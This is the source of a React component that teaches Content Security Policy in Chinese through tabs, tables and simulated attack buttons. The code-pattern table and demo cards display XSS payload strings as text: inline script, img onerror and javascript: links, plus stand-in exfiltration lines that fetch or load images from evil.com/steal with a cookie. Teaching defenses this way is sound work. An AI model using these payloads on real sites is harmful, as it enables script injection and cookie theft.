import React, { useState, useRef } from 'react';
import {
  Card,
  Button,
  Tag,
  Alert,
  Space,
  Typography,
  Divider,
  Tabs,
  Switch,
  Select,
  Steps,
} from 'antd';
import {
  SafetyOutlined,
  WarningOutlined,
  LockOutlined,
  UnlockOutlined,
  CloseCircleFilled,
  CheckCircleFilled,
} from '@ant-design/icons';
const { Text, Paragraph, Title } = Typography;

// ══════════════════════════════════════════════
// Tab 1: 核心概念（不变）
// ══════════════════════════════════════════════

const CspConceptDemo: React.FC = () => (
  <Space direction="vertical" style={{ width: '100%' }} size="middle">
    <Card size="small" style={{ background: '#fffbe6' }}>
      <Title level={5} style={{ margin: 0, color: '#faad14' }}>
        🎯 CSP 是什么？「俱乐部保安」类比
      </Title>
      <div style={{ marginTop: 12 }}>
        <Paragraph>
          想象你的网页是一个<strong>高档夜总会</strong>，CSP 就是门口的保安：
        </Paragraph>
        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
          <tbody>
            <tr>
              <td style={{ padding: 8, border: '1px solid #f0f0f0', width: 130 }}>🚪 保安 = CSP</td>
              <td style={{ padding: 8, border: '1px solid #f0f0f0' }}>
                站在门口，检查每个想进来的人
              </td>
            </tr>
            <tr>
              <td style={{ padding: 8, border: '1px solid #f0f0f0' }}>📋 贵宾名单 = CSP 策略</td>
              <td style={{ padding: 8, border: '1px solid #f0f0f0' }}>
                保安手里的名单：<Text code>script-src: 'self'</Text>
              </td>
            </tr>
            <tr>
              <td style={{ padding: 8, border: '1px solid #f0f0f0' }}>🕵️ 假邀请函 = XSS 攻击</td>
              <td style={{ padding: 8, border: '1px solid #f0f0f0' }}>
                攻击者伪造成「可信脚本」想混进来
              </td>
            </tr>
            <tr>
              <td style={{ padding: 8, border: '1px solid #f0f0f0' }}>✅ 名字在名单上 = 放行</td>
              <td style={{ padding: 8, border: '1px solid #f0f0f0' }}>来源可信 → 允许执行</td>
            </tr>
            <tr>
              <td style={{ padding: 8, border: '1px solid #f0f0f0' }}>❌ 不在名单上 = 拦下</td>
              <td style={{ padding: 8, border: '1px solid #f0f0f0' }}>
                恶意脚本被拒绝，<strong>根本不执行</strong>
              </td>
            </tr>
            <tr>
              <td style={{ padding: 8, border: '1px solid #f0f0f0', background: '#fff2f0' }}>
                ⚠️ unsafe-inline = 保安说「所有人进来」
              </td>
              <td style={{ padding: 8, border: '1px solid #f0f0f0', background: '#fff2f0' }}>
                白名单失去意义——任何内联脚本都能执行
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </Card>
    <Card size="small" title="CSP 的核心指令（保安检查什么）">
      <Space direction="vertical" style={{ width: '100%' }}>
        <Alert
          message={
            <>
              <Tag color="blue">script-src</Tag> 控制 JS 脚本来源（最重要的指令）
            </>
          }
          description={
            <>
              <Text code>"script-src 'self'"</Text> — 只允许同域 JS。脚本来自 evil.com → 拦截！
              <br />
              <Text code>"script-src 'self' cdn.com"</Text> — 允许同域 + CDN
              <br />
              <Text style={{ color: '#faad14' }}>
                ⚠️ <Text code>'unsafe-inline'</Text> 允许所有内联脚本，<strong>极大削弱 CSP</strong>
              </Text>
            </>
          }
          type="info"
          showIcon
        />
        <Alert
          message={
            <>
              <Tag color="orange">connect-src</Tag> 控制 fetch/XHR/WebSocket 连接目标
            </>
          }
          description="connect-src 'self' → 攻击者的 fetch('https://evil.com/steal') 被拦截，数据发不出去"
          type="info"
          showIcon
        />
        <Alert
          message={
            <>
              <Tag color="green">img-src</Tag> 控制图片来源
            </>
          }
          description="img-src 'self' → 攻击者的 <img src='https://evil.com/steal?cookie='> 被拦截"
          type="info"
          showIcon
        />
        <Alert
          message={
            <>
              <Tag color="purple">frame-ancestors</Tag> 控制谁能用 iframe 嵌入你的页面
            </>
          }
          description="frame-ancestors 'none' → 防点击劫持，阻止任何网站用 iframe 嵌入"
          type="info"
          showIcon
        />
        <Alert
          message={
            <>
              <Tag color="cyan">base-uri</Tag> 控制 {'<base>'} 标签
            </>
          }
          description="base-uri 'self' → 防 DOM Clobbering 篡改 {'<base>'} 标签劫持所有相对路径"
          type="info"
          showIcon
        />
      </Space>
    </Card>
    <Alert
      message="关键理解：CSP 是浏览器自带的硬限制，不是 JS 代码"
      description="即使攻击者成功注入了 {'<script>'} 标签，只要它的来源不在 CSP 白名单中，浏览器就直接拒绝执行——连 JS 引擎都到不了。这是 React/Vue 编码之外的第二道防线，而且是一道更强的防线。"
      type="success"
      showIcon
    />
  </Space>
);

// ══════════════════════════════════════════════
// Tab 2: 实战对照表 —— 哪些代码会被拦？哪些不会？
// ══════════════════════════════════════════════

type CspKey = 'safe' | 'plusCdn' | 'unsafeInline' | 'unsafeEval' | 'off';

const CSP_PROFILES: Record<CspKey, { name: string; desc: string; scriptSrc: string }> = {
  safe: {
    name: '✅ 严格模式',
    desc: 'script-src 只允许同源，禁止内联脚本、事件处理器、javascript:协议、eval()',
    scriptSrc: "script-src 'self'",
  },
  plusCdn: {
    name: '⚠️ 常见模式（含 CDN）',
    desc: 'script-src 允许同源和一个 CDN，但仍然禁止内联脚本和 eval()',
    scriptSrc: "script-src 'self' cdn.example.com",
  },
  unsafeInline: {
    name: '❌ +unsafe-inline',
    desc: '允许内联脚本！onerror、onclick、<script>标签内联代码都能执行',
    scriptSrc: "script-src 'self' 'unsafe-inline'",
  },
  unsafeEval: {
    name: '❌ +unsafe-inline+unsafe-eval',
    desc: '内联脚本和 eval() 都允许，CSP 防护基本失效',
    scriptSrc: "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
  },
  off: { name: '🔓 CSP 关闭', desc: '没有任何 CSP 限制', scriptSrc: '无 CSP' },
};

const getBlocked = (id: string, key: CspKey): boolean => {
  if (key === 'off') return false;
  switch (id) {
    case 'inline-script':
    case 'onerror':
    case 'js-protocol':
      return key === 'safe' || key === 'plusCdn';
    case 'ext-cross':
      return true;
    case 'ext-cdn':
      return key === 'safe';
    case 'eval':
    case 'newfunc':
      return key === 'safe' || key === 'plusCdn' || key === 'unsafeInline';
    case 'fetch-evil':
    case 'img-evil':
      return true;
    case 'base-tag':
    case 'dom-clob':
    case 'iframe-embed':
      return false;
    default:
      return false;
  }
};

const CODES = [
  {
    id: 'inline-script',
    cat: '🔴 内联脚本',
    code: '<script>alert("XSS")</script>',
    desc: '攻击者最常用的方式，把 JS 直接写在页面上',
  },
  {
    id: 'onerror',
    cat: '🔴 内联脚本',
    code: '<img src=x onerror="alert(1)">',
    desc: '事件处理器，绕过只过滤 <script> 标签的防御',
  },
  {
    id: 'js-protocol',
    cat: '🔴 内联脚本',
    code: '<a href="javascript:alert(1)">点我</a>',
    desc: 'React 对 href 属性不做任何检查，javascript: 协议直接执行',
  },
  {
    id: 'ext-cross',
    cat: '🟠 外部脚本',
    code: '<script src="https://evil.com/hack.js">',
    desc: '从外域服务器加载恶意 JS',
  },
  {
    id: 'ext-same',
    cat: '🟠 外部脚本',
    code: '<script src="/app.js">',
    desc: '你自己网站上的 JS 文件，正常业务代码，永远放行',
  },
  {
    id: 'ext-cdn',
    cat: '🟠 外部脚本',
    code: '<script src="https://cdn.example.com/lib.js">',
    desc: '从 CDN 加载的第三方库（如 React、lodash）。严格模式下被拦，除非加到白名单',
  },
  { id: 'eval', cat: '🟡 动态执行', code: 'eval("alert(1)")', desc: '动态执行字符串代码' },
  {
    id: 'newfunc',
    cat: '🟡 动态执行',
    code: 'new Function("alert(1)")()',
    desc: '等价于 eval 的动态执行方式',
  },
  {
    id: 'fetch-evil',
    cat: '🔵 网络请求',
    code: 'fetch("https://evil.com/steal?c="+cookie)',
    desc: '攻击者窃取数据后通过 fetch 外传',
  },
  {
    id: 'fetch-same',
    cat: '🔵 网络请求',
    code: 'fetch("/api/user")',
    desc: '正常的同源 API 请求，业务能用，永远放行',
  },
  {
    id: 'img-evil',
    cat: '🔵 网络请求',
    code: '<img src="https://evil.com/steal?c=">',
    desc: '通过 img 标签的 src 外传数据',
  },
  {
    id: 'base-tag',
    cat: '🟣 特殊场景',
    code: '<base href="https://evil.com/">',
    desc: '篡改 base 标签后，所有相对路径指向攻击者服务器。需要 base-uri 指令防御，script-src 管不到',
  },
  {
    id: 'dom-clob',
    cat: '🟣 特殊场景',
    code: '<a id="config" name="apiUrl" href="https://evil.com">',
    desc: 'DOM Clobbering，通过 HTML 元素覆盖 JS 变量。CSP 无法防御',
  },
  {
    id: 'iframe-embed',
    cat: '🟣 特殊场景',
    code: '<iframe src="https://evil.com/phishing.html">',
    desc: '嵌入恶意 iframe（点击劫持），需要 frame-ancestors 防御，script-src 管不到',
  },
];

const CATEGORIES = ['🔴 内联脚本', '🟠 外部脚本', '🟡 动态执行', '🔵 网络请求', '🟣 特殊场景'];

const CodeChecklist: React.FC = () => {
  const [cspKey, setCspKey] = useState<CspKey>('safe');
  const profile = CSP_PROFILES[cspKey];
  const cycle = () => {
    const keys: CspKey[] = ['safe', 'plusCdn', 'unsafeInline', 'unsafeEval', 'off'];
    setCspKey(keys[(keys.indexOf(cspKey) + 1) % keys.length]);
  };
  return (
    <Space direction="vertical" style={{ width: '100%' }} size="middle">
      <Alert
        message="对照表使用方式"
        description="下面列出 14 种「你在真实开发中可能遇到的代码模式」。点击按钮切换 CSP 配置，观察每一行的拦截/放行状态如何变化。"
        type="info"
        showIcon
      />
      <Card size="small" style={{ background: '#fafafa' }}>
        <Space direction="vertical" style={{ width: '100%' }} size="small">
          <Space>
            <Button
              type={cspKey === 'off' ? 'default' : 'primary'}
              danger={cspKey === 'unsafeInline' || cspKey === 'unsafeEval'}
              onClick={cycle}
              icon={profile.name.includes('❌') ? <UnlockOutlined /> : <LockOutlined />}
              size="large"
            >
              切换 CSP 模式（当前：{profile.name}）
            </Button>
          </Space>
          {cspKey !== 'off' && (
            <>
              <Divider style={{ margin: '4px 0' }} />
              <Text
                code
                style={{
                  fontSize: 11,
                  wordBreak: 'break-all',
                  background: '#1a1a1a',
                  color: '#b7eb8f',
                  padding: '6px 10px',
                  borderRadius: 4,
                }}
              >
                Content-Security-Policy: {profile.scriptSrc}
              </Text>
              <Text style={{ fontSize: 12, color: '#888' }}>{profile.desc}</Text>
            </>
          )}
          {cspKey === 'off' && (
            <Tag color="red" style={{ fontSize: 13 }}>
              🔓 无 CSP — 所有代码都放行
            </Tag>
          )}
        </Space>
      </Card>

      <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 13 }}>
        <thead>
          <tr>
            <th
              style={{
                border: '2px solid #d9d9d9',
                padding: 10,
                background: '#fafafa',
                width: '18%',
              }}
            >
              类别
            </th>
            <th
              style={{
                border: '2px solid #d9d9d9',
                padding: 10,
                background: '#fafafa',
                width: '35%',
              }}
            >
              代码示例
            </th>
            <th
              style={{
                border: '2px solid #d9d9d9',
                padding: 10,
                background: '#fafafa',
                width: '12%',
                textAlign: 'center',
              }}
            >
              ❌拦截 / ✅放行
            </th>
            <th
              style={{
                border: '2px solid #d9d9d9',
                padding: 10,
                background: '#fafafa',
                width: '35%',
              }}
            >
              实战说明
            </th>
          </tr>
        </thead>
        <tbody>
          {CATEGORIES.map((cat) => {
            const items = CODES.filter((r) => r.cat === cat);
            return items.map((item, idx) => {
              const blocked = getBlocked(item.id, cspKey);
              return (
                <tr key={item.id} style={{ background: blocked ? '#fff2f0' : '#f6ffed' }}>
                  {idx === 0 && (
                    <td
                      rowSpan={items.length}
                      style={{
                        border: '1px solid #e8e8e8',
                        padding: 10,
                        fontWeight: 'bold',
                        verticalAlign: 'top',
                        background: '#fafafa',
                      }}
                    >
                      {cat}
                    </td>
                  )}
                  <td
                    style={{
                      border: '1px solid #e8e8e8',
                      padding: 10,
                      fontFamily: 'monospace',
                      fontSize: 12,
                    }}
                  >
                    <Text code style={{ wordBreak: 'break-all' }}>
                      {item.code}
                    </Text>
                  </td>
                  <td style={{ border: '1px solid #e8e8e8', padding: 10, textAlign: 'center' }}>
                    {blocked ? (
                      <Tag
                        icon={<CloseCircleFilled />}
                        color="error"
                        style={{ fontSize: 13, padding: '2px 12px', margin: 0 }}
                      >
                        ❌ 拦截
                      </Tag>
                    ) : (
                      <Tag
                        icon={<CheckCircleFilled />}
                        color="success"
                        style={{ fontSize: 13, padding: '2px 12px', margin: 0 }}
                      >
                        ✅ 放行
                      </Tag>
                    )}
                  </td>
                  <td style={{ border: '1px solid #e8e8e8', padding: 10, fontSize: 12 }}>
                    {item.desc}
                    {blocked && (
                      <div style={{ color: '#52c41a', marginTop: 4 }}>
                        🛡️ 当前配置成功拦截此攻击
                      </div>
                    )}
                    {!blocked && cspKey !== 'off' && (
                      <div style={{ color: '#faad14', marginTop: 4 }}>
                        ⚠️ 当前配置未拦截此项，可能被攻击者利用
                      </div>
                    )}
                  </td>
                </tr>
              );
            });
          })}
        </tbody>
      </table>

      <Button onClick={cycle} type="dashed" block>
        再点一下切换 CSP 模式，看表格怎么变
      </Button>
    </Space>
  );
};

// ══════════════════════════════════════════════
// Tab 3: CSP 阻止 XSS 实操（原有的互动 Demo）
// ══════════════════════════════════════════════

const CspBlockXssDemo: React.FC = () => {
  const [cspEnabled, setCspEnabled] = useState(true);
  const [inlineEnabled, setInlineEnabled] = useState(false);
  const [evalEnabled, setEvalEnabled] = useState(false);
  const [connectEnabled, setConnectEnabled] = useState(false);
  const [hrefR, setHrefR] = useState<'none' | 'blocked' | 'executed'>('none');
  const [evalR, setEvalR] = useState<'none' | 'blocked' | 'executed'>('none');
  const [fetchR, setFetchR] = useState<'none' | 'blocked' | 'executed'>('none');
  const imgRef = useRef<HTMLImageElement>(null);

  const cspStr = () => {
    const p = ["default-src 'self'"];
    if (inlineEnabled) p.push("script-src 'self' 'unsafe-inline'");
    else p.push("script-src 'self'");
    if (evalEnabled) p.push(" + 'unsafe-eval'");
    if (connectEnabled) p.push('connect-src *');
    return p.join('; ');
  };

  return (
    <Space direction="vertical" style={{ width: '100%' }} size="small">
      <Alert
        message="现在切换到实战模式"
        description="下面有 4 种你在 LiveDemo 中见过的 XSS 攻击。用开关调整 CSP 配置，然后点击每个攻击的按钮，看 CSP 是否拦截了它。"
        type="warning"
        showIcon
      />

      {/* CSP 控制栏 */}
      <Card size="small" style={{ background: '#fafafa' }}>
        <Space direction="vertical" style={{ width: '100%' }} size="small">
          <Space>
            <Switch
              checked={cspEnabled}
              onChange={() => setCspEnabled(!cspEnabled)}
              checkedChildren="CSP 开"
              unCheckedChildren="CSP 关"
            />
            <Text strong>{cspEnabled ? '🛡️ CSP 已启用' : '🔓 CSP 已禁用'}</Text>
          </Space>
          {cspEnabled && (
            <>
              <Divider style={{ margin: '4px 0' }} />
              <Space wrap size={12}>
                <Space size={4}>
                  <Tag>unsafe-inline</Tag>
                  <Switch
                    size="small"
                    checked={inlineEnabled}
                    onChange={() => setInlineEnabled(!inlineEnabled)}
                  />
                  <Text style={{ fontSize: 12 }}>
                    {inlineEnabled ? '⚠️ 允许内联' : '✅ 禁止内联'}
                  </Text>
                </Space>
                <Space size={4}>
                  <Tag>unsafe-eval</Tag>
                  <Switch
                    size="small"
                    checked={evalEnabled}
                    onChange={() => setEvalEnabled(!evalEnabled)}
                  />
                  <Text style={{ fontSize: 12 }}>
                    {evalEnabled ? '⚠️ 允许 eval' : '✅ 禁止 eval'}
                  </Text>
                </Space>
                <Space size={4}>
                  <Tag>connect-src</Tag>
                  <Switch
                    size="small"
                    checked={connectEnabled}
                    onChange={() => setConnectEnabled(!connectEnabled)}
                  />
                  <Text style={{ fontSize: 12 }}>{connectEnabled ? '⚠️ 任意域' : '✅ 仅同源'}</Text>
                </Space>
              </Space>
              <Text code style={{ fontSize: 11, wordBreak: 'break-all' }}>
                Content-Security-Policy: {cspStr()}
              </Text>
            </>
          )}
        </Space>
      </Card>

      {/* 攻击 1: javascript: 协议 */}
      <Card size="small" title="攻击 1：href 中的 javascript: 协议">
        <Space direction="vertical" style={{ width: '100%' }}>
          <Text code>{'<a href="javascript:alert(1)">点我</a>'}</Text>
          <Space>
            <Button
              onClick={() => setHrefR(cspEnabled && !inlineEnabled ? 'blocked' : 'executed')}
              icon={<WarningOutlined />}
            >
              模拟点击链接
            </Button>
            {hrefR === 'blocked' && <Tag color="green">🛡️ CSP 拦截！严格模式/常见模式都拦</Tag>}
            {hrefR === 'executed' && (
              <Tag color="red">
                {cspEnabled ? '❌ unsafe-inline 开启了，JS 协议通过' : '❌ CSP 关闭，攻击成功'}
              </Tag>
            )}
          </Space>
          <Text style={{ fontSize: 12, color: hrefR === 'blocked' ? '#52c41a' : '#666' }}>
            {hrefR === 'blocked'
              ? '即使 React 没编码这个 href，CSP 在白名单层面就拦截了 javascript: 协议的执行'
              : 'javascript: 被当作内联脚本，需要 unsafe-inline 才放行，严格模式直接拦'}
          </Text>
        </Space>
      </Card>

      {/* 攻击 2: img onerror */}
      <Card size="small" title="攻击 2：img onerror 内联事件">
        <Space direction="vertical" style={{ width: '100%' }}>
          <Text code>{'<img src=x onerror="alert(1)">'}</Text>
          <Space>
            <Button onClick={() => imgRef.current?.click()} icon={<WarningOutlined />}>
              加载恶意图片
            </Button>
            <img
              ref={imgRef}
              src="broken.jpg"
              onError={() => {
                if (cspEnabled && !inlineEnabled)
                  alert(
                    '🛡️ CSP 拦截！\nonerror 中的内联脚本被 CSP script-src 策略阻止，不会执行。'
                  );
                else
                  alert('❌ XSS 执行！没有 CSP 或开启了 unsafe-inline，onerror 中的 JS 被执行了。');
              }}
              style={{ display: 'none' }}
              alt=""
            />
          </Space>
          <Text type={cspEnabled && !inlineEnabled ? 'success' : 'warning'}>
            {cspEnabled && !inlineEnabled
              ? '✅ CSP 拦截了内联 onerror。img 虽然插入了页面，但 onerror 中的 JS 被浏览器拒绝执行'
              : '⚠️ 未拦截。onerror 属于内联脚本，必须禁止 unsafe-inline 才安全'}
          </Text>
        </Space>
      </Card>

      {/* 攻击 3: eval */}
      <Card size="small" title="攻击 3：eval() 动态执行">
        <Space direction="vertical" style={{ width: '100%' }}>
          <Text code>{'eval("alert(\'XSS\')")'}</Text>
          <Space>
            <Button
              onClick={() => setEvalR(cspEnabled && !evalEnabled ? 'blocked' : 'executed')}
              icon={<WarningOutlined />}
            >
              执行 eval
            </Button>
            {evalR === 'blocked' && <Tag color="green">🛡️ CSP 拦截！禁止了 unsafe-eval</Tag>}
            {evalR === 'executed' && (
              <Tag color="red">
                {cspEnabled ? '❌ 开启了 unsafe-eval，eval 通过' : '❌ CSP 关闭，攻击成功'}
              </Tag>
            )}
          </Space>
        </Space>
      </Card>

      {/* 攻击 4: 数据外传 */}
      <Card size="small" title="攻击 4：数据外传 fetch 到 evil.com">
        <Space direction="vertical" style={{ width: '100%' }}>
          <Text code>{"fetch('https://evil.com/steal?c=' + cookie)"}</Text>
          <Space>
            <Button
              onClick={() => setFetchR(cspEnabled && !connectEnabled ? 'blocked' : 'executed')}
              icon={<WarningOutlined />}
            >
              模拟数据外传
            </Button>
            {fetchR === 'blocked' && (
              <Tag color="green">🛡️ CSP 拦截！connect-src 阻止了跨域请求</Tag>
            )}
            {fetchR === 'executed' && (
              <Tag color="red">
                {cspEnabled ? '❌ connect-src 设为 *，数据可以发出去' : '❌ CSP 关闭，攻击成功'}
              </Tag>
            )}
          </Space>
        </Space>
      </Card>
    </Space>
  );
};

// ══════════════════════════════════════════════
// Tab 4: 配置对比（原有的）
// ══════════════════════════════════════════════

const CspConfigDemo: React.FC = () => {
  const [config, setConfig] = useState('secure');
  const configs: Record<
    string,
    { name: string; header: string; desc: string; safety: 'safe' | 'medium' | 'danger' }
  > = {
    secure: {
      name: '✅ 严格配置（推荐）',
      header:
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'",
      desc: '仅允许同域资源。内联脚本被禁止。大多数生产应用的推荐基线配置。',
      safety: 'safe',
    },
    strict: {
      name: '🛡️ 银行级配置（最安全）',
      header:
        "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'",
      desc: 'default-src 设为 none，只显式允许最小白名单。连内联样式都禁止。银行、金融等高安全场景。',
      safety: 'safe',
    },
    cdn: {
      name: '⚠️ 生产常见配置',
      header:
        "default-src 'self'; script-src 'self' cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' api.example.com",
      desc: '允许 CDN 来源的脚本，允许 data: 图片。大多数生产应用的典型配置。',
      safety: 'medium',
    },
    unsafe: {
      name: '❌ 不安全配置',
      header: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *",
      desc: '允许所有内联脚本和 eval()！CSP 的 XSS 防御力被大幅削弱。connect-src: * 允许数据外传到任何服务器。',
      safety: 'danger',
    },
    wildcard: {
      name: '❌ 极危险配置',
      header: "default-src *; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src *; img-src *",
      desc: '没有任何限制！脚本可以从任何来源加载和执行。这种配置等于没有 CSP。',
      safety: 'danger',
    },
  };
  const cur = configs[config];
  return (
    <Space direction="vertical" style={{ width: '100%' }} size="small">
      <Select value={config} onChange={setConfig} style={{ width: '100%' }}>
        <Select.Option value="strict">🛡️ 银行级（最安全）</Select.Option>
        <Select.Option value="secure">✅ 严格配置（推荐）</Select.Option>
        <Select.Option value="cdn">⚠️ 常见生产配置</Select.Option>
        <Select.Option value="unsafe">❌ 不安全配置</Select.Option>
        <Select.Option value="wildcard">❌ 极危险配置</Select.Option>
      </Select>
      <Card
        size="small"
        style={{
          background:
            cur.safety === 'safe' ? '#f6ffed' : cur.safety === 'medium' ? '#fffbe6' : '#fff2f0',
        }}
      >
        <Space direction="vertical" style={{ width: '100%' }}>
          <Tag
            color={cur.safety === 'safe' ? 'green' : cur.safety === 'medium' ? 'orange' : 'red'}
            style={{ fontSize: 14, padding: '2px 8px' }}
          >
            {cur.name}
          </Tag>
          <div
            style={{
              background: '#000',
              color: '#b7eb8f',
              padding: '8px 12px',
              borderRadius: 4,
              fontSize: 12,
              wordBreak: 'break-all',
              fontFamily: 'monospace',
            }}
          >
            Content-Security-Policy: {cur.header}
          </div>
          <Text>{cur.desc}</Text>
          <Divider style={{ margin: '8px 0' }} />
          <Text strong>XSS 防御效果评估表：</Text>
          <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 12 }}>
            <thead>
              <tr style={{ background: '#fafafa' }}>
                {[
                  '<script> 标签',
                  'onerror/onload',
                  'javascript:',
                  'eval()',
                  '数据外传',
                  '外域脚本',
                ].map((h) => (
                  <th key={h} style={{ border: '1px solid #f0f0f0', padding: '4px 8px' }}>
                    {h}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody>
              <tr>
                {(
                  {
                    strict: [true, true, true, true, true, true],
                    secure: [true, true, true, true, true, true],
                    cdn: [true, true, true, true, true, false],
                    unsafe: [false, false, true, false, false, false],
                    wildcard: [false, false, false, false, false, false],
                  }[config] as boolean[]
                ).map((blocked, i) => (
                  <td
                    key={i}
                    style={{
                      padding: '4px 8px',
                      border: '1px solid #f0f0f0',
                      color: blocked ? '#52c41a' : '#ff4d4f',
                      background: blocked ? '#f6ffed' : '#fff2f0',
                    }}
                  >
                    {blocked ? '✅ 拦截' : '❌ 可执行'}
                  </td>
                ))}
              </tr>
            </tbody>
          </table>
        </Space>
      </Card>
      <Alert
        message="最佳实践：从 Report-Only 模式开始部署 CSP"
        description="CSP 有两种模式：① enforce（强制）——违规直接拦截；② report-only（仅报告）——违规不拦截，只向 report-uri 发送违规报告。建议先从 report-only 开始，观察是否有合法脚本被误拦，确认无误后再切换到 enforce 模式。"
        type="info"
        showIcon
      />
    </Space>
  );
};

// ══════════════════════════════════════════════
// 主组件
// ══════════════════════════════════════════════

const CspLiveDemo: React.FC = () => {
  const [tab, setTab] = useState('checklist');
  return (
    <Card
      title={
        <Space>
          <SafetyOutlined style={{ color: '#52c41a', fontSize: 20 }} />
          <span>CSP 内容安全策略 — 从概念到实战</span>
        </Space>
      }
    >
      <Alert
        message="一句话理解 CSP"
        description={
          <>
            <Text strong>CSP = 给浏览器一份白名单，告诉浏览器哪些来源的代码可以执行。</Text>
            <br />
            浏览器在加载和执行每段代码之前都会查这份名单。在名单上的放行，不在的拦截。
            <strong>
              这是浏览器层面的硬限制，XSS 注入的脚本无论多高明，只要来源不在白名单上就不执行。
            </strong>
          </>
        }
        type="success"
        showIcon
        style={{ marginBottom: 16 }}
      />
      <Tabs
        activeKey={tab}
        onChange={setTab}
        size="small"
        items={[
          { key: 'concept', label: '🧠 核心概念', children: <CspConceptDemo /> },
          { key: 'checklist', label: '📋 实战对照表', children: <CodeChecklist /> },
          { key: 'block', label: '🛡️ CSP 阻止 XSS', children: <CspBlockXssDemo /> },
          { key: 'config', label: '⚙️ 配置对比', children: <CspConfigDemo /> },
        ]}
      />
      <Divider />
      <Card size="small" style={{ background: '#f6ffed' }}>
        <Title level={5} style={{ color: '#52c41a', margin: 0 }}>
          💡 记住这三点
        </Title>
        <ol style={{ marginTop: 12, marginBottom: 0, paddingLeft: 20 }}>
          <li>
            <strong>先看「实战对照表」</strong>—— 什么时候拦、什么时候放，一目了然
          </li>
          <li>
            <strong>再看「CSP 阻止 XSS」</strong>—— 动手操作，验证对照表的结论
          </li>
          <li>
            <strong>千万别加 unsafe-inline</strong>—— 它让 CSP 对内联脚本的防御直接作废
          </li>
        </ol>
      </Card>
    </Card>
  );
};

export default CspLiveDemo;
